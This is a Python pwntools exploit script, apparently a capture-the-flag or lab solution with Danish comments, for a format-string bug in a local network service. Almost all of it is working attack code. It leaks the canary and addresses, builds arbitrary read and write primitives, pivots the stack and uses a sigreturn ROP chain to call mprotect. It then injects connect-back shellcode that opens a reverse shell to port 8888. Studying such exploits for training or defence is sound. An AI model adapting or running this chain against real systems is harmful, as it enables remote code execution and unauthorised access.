#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *

context(arch = "i386", os = "linux", log_level = 'ERROR')

#%134 - Canary
#%136 - 12288 bytes into fmt
#%137 - 556 bytes further than buffer
#ret lies 528 bytes further than buffer
#%139 - Socket fd

r = remote("localhost", 20002)
r.recvuntil("How may I help you?\n")

#Nu kender vi positionerne og offsets på alt hvad vi vil vide, lad os leake dem
r.sendline(flat(
    "%134$08x",
    "%136$08x",
    "%137$08x",#ebp1
    "%139$08x",
    "%145$08x",#ebp2
    "%157$08x" #ebp3
    ))
line = r.recvline().rstrip()
canary = int(line[0:8], 16)
fmt_base = int(line[8:16], 16) - 12288
ebp1 = int(line[16:24], 16)
buffer = ebp1 - 556
ret = buffer + 528
socket_fd = int(line[24:32], 16)
ebp2 = int(line[32:40], 16)
ebp3 = int(line[40:48], 16)

print "Canary: 0x%08x" % canary
print "fmt is loaded at 0x%08x" % fmt_base
print "buffer is at 0x%08x" % buffer
print "return address is at 0x%08x" % ret
print "socket fd: %d" % socket_fd
print "ebp1: 0x%08x" % ebp1
print "ebp2: 0x%08x" % ebp2
print "ebp3: 0x%08x" % ebp3

def send_receive(d):
    r.sendline(d + 'THE_END')
    return r.recvuntil('THE_END\n').split('THE_END')[0]

#Så laver vi en funktion som skaber en pointer
def make_pointer(addr):
    #Vi bruger ebp1 til at opdatere ebp2
    send_receive('A' * ((ebp2 & 0xff) + 0) + '%137$hhn')
    send_receive('A' * ((addr >> 0) & 0xff) + '%145$hhn')

    send_receive('A' * ((ebp2 & 0xff) + 1) + '%137$hhn')
    send_receive('A' * ((addr >> 8) & 0xff) + '%145$hhn')

    send_receive('A' * ((ebp2 & 0xff) + 2) + '%137$hhn')
    send_receive('A' * ((addr >> 16) & 0xff) + '%145$hhn')

    send_receive('A' * ((ebp2 & 0xff) + 3) + '%137$hhn')
    send_receive('A' * ((addr >> 24) & 0xff) + '%145$hhn')

#Vi skal udbygge med arbitrary write og bevise det ved at overskrive retur adressen
#Denne funktion skal skrive 'data' til 'addr'
def poke(addr, data):
    for i in range(len(data)):
        make_pointer(addr + i)
        send_receive('A' * ord(data[i]) + '%157$hhn')

#Vi skal lave en funktion som kan læse en hvilken som helst adresse
def peek(addr):
    make_pointer(addr)
    return send_receive('%157$s') + '\0'

payload = asm(
            shellcraft.connect(util.net.interfaces4()['docker0'][0], 8888) +
            shellcraft.dupsh('edx')
        )

PAGE_SIZE  = 0x1000
PAGE_MASK  = ~(PAGE_SIZE-1)

add_esp_44 = fmt_base + 0x00000d13 # add esp, 0x44 ; pop ebx ; pop ebp ; ret

POP_EAX    = fmt_base + 0x00000d7b # pop eax ; ret
INT_80     = fmt_base + 0x00000e88 # int 0x80 ; ret

# Stack pivot
poke(ret, p32(add_esp_44))

# Sigreturn ROP chain
# eax = SYS_mprotect
# ebx = addr
# ecx = len
# edx = PROT_READ | PROT_WRITE | PROT_EXEC
rop_addr = ret + 0x44 + 12
rop_chain = flat(POP_EAX, int(constants.SYS_sigreturn), INT_80)

f = SigreturnFrame(kernel = 'amd64')
f.eax = constants.SYS_mprotect
f.ebx = buffer & PAGE_MASK
f.ecx = PAGE_SIZE * 2
f.edx = 7
f.esp = rop_addr + len(rop_chain) + len(str(f))
f.eip = INT_80

rop_chain += flat(str(f), buffer)

poke(rop_addr, rop_chain)
r.sendline(payload)

shell = listen(8888)
r.close()
shell.wait_for_connection()
shell.interactive()
